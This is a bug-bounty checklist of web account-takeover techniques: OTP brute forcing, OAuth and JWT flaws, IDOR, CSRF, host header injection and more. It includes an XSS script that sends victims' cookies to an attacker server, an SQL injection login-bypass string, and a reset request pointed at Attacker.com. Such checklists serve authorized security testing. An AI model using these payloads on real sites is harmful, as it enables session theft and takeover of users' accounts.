[ ] **a lot of ideas in this article by omar hashem**
```
https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5
```
[ ] **OAuth to Account takeover**
```
https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover
```


[ ] **Pre-Account Takeover**                                                  

A pre-account takeover occurs when an attacker creates a user account using one signup method and the victim creates another account using a different signup method using the same email address. Because the email addresses are the same, the application connects the two accounts. when the app is unable to validate email addresses.
```
How to hunt :-
    Try registering any email address without verifying it.
    Try registering an account again, but this time with a different method, such as ‘sign up with Google’ from same email address.
    Due to the fact that both email addresses are the same, the web application will link the two accounts.
    Now try logging in using the specified password and username. Check to see whether you can see information from that account that was retrieved via Google.
```


[ ] **Account takeover due to Improper Rate limit**
```
How to Hunt:-

    capture the request at the login page, while providing username and password.
    send it to intruder and Brute force it.
    Analyze the response and length.
```


[ ] **Account takeover by utilizing sensitive data exposure**
```
Sensitive data exposure occurs when a web application failed to properly protect confidential information, resulting in the disclosure of sensitive information or data about users, or anything related to them, to a third party.

Occasionally, the application displays unnecessary data, such as valid OTPs, hashes, or passwords, over the request and response parts. So it’s a good idea to pay attention to the response and request portions.
```


[ ] **login**                                                                                                                                 
```
1. check if you are able to brute force the password
2. Test for OAuth misconfigurations
3. check if you are able to bruteforce the login OTP
4. check for JWT mesconfigurations
5. Test for SQL injection to bypass authentication ```admin" or 1=1;--```
6. check if the application validates the OTP or Token
```


[ ] **password reset**
```
1. check if you are able to brute force the password reset OTP
2. test for token predectability
3. test for JWT misconfigurations
4. check if the password reset endpoint is vulnerable to IDOR
5. check if the password reset endpoint is vulnerable to Host Header injection
6. check if the password reset endpoint is leaking the token or OTP in the HTTP response
7. check if the application validates the OTP or Token
8. test for HTTP parameter Pollution (HPP)
    
```


[ ] **XSS to Account Takeover**

if the application does not use auth token or you can't access the cookies because the "HttpOnly" flag, you can obtain the CSRF token and craft a request to change the user's email or password       
```
1. try to exfiltrate the cookies
2. try to exfiltrate the Auth Token
3. if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies
    - PoC Example:
        ```html
        
        <script>
            /*
            this script will create a hidden <img> element
            when the browser tries to load the image
            the victim's cookies will be sent to your server
            */

            var new_img = document.createElement('img');
            new_img.src = "http://yourserver/" + document.cookie;
            new_img.style = 'display: none;'
            document.body.appendChild(new_img);
        </script>

        ```
```


[ ] **CSRF to Account Takeover**
```
1. check if the email update endpoint is vulnerable to CSRF
2. check if the password change endpoint is vulnerable to CSRF
```


[ ] **IDOR to Account Takerover**
```
1. checck if the email update endpoint is vulnerable to IDOR
2. check if the password change endpoint is vulnerable to IDOR
3. check if the password reset endpoint vulnerable to IDOR
```


[ ] **Account takeover by Response & Status code Manipulation**


[ ] **Account takeover by exploiting Weak cryptography**
```
check this
https://infosecwriteups.com/weak-cryptography-in-password-reset-to-full-account-takeover-fc61c75b36b9
```


[ ] **Password or email change function**
```
IF you try to change password and see email parameter in password change request, Try changing your email to victim email
```


[ ] **Sing-Up Function**
```
IF you try to sing-up new account in target site, in email filed try set target email

IF you try to sing-up new account in target site using 3rd party, in 3d party use phone number instead email then link 3rd account with target site.Then Go setting try link victim email in you account
```

[ ] **Rest Token**
```
Try to use your REST Token with Target account. Hint: email=Target@email.com&code=$Attacker_TOKEN$

Brute Force Rest Token if it is numeric. Hint : email=Target@email.com&code=$TOKEN$

Try to figure out how the token are generated: 1. Generated based on TimeStamp OR ID of user OR email of user
```

[ ] **Host Header Injection**
```
when send rest account request intercept POST Request and Change Host header value from target.site TO Attacker.com: Hint POST /PassRest HTTP1/1 Host: Attacker.com
```

[ ] **CORS Misconfiguration to Account Takeover**

If the page contains CORS missconfigurations you might be able to steal sensitive information from the user to takeover his account or make him change auth information for the same purpose:
```
https://book.hacktricks.xyz/pentesting-web/cors-bypass
```
[ ] **Account takeover via leaked session cookie**
```
https://hackerone.com/reports/745324
```
[ ] **HTTP Request Smuggling to ATO**
```
https://hackerone.com/reports/737140
https://hackerone.com/reports/740037
```

[ ] **Bypassing Digits origin validation which leads to account takeover**
```
https://hackerone.com/reports/129873
```
[ ] Top ATO report in hackerone
```
https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md
```
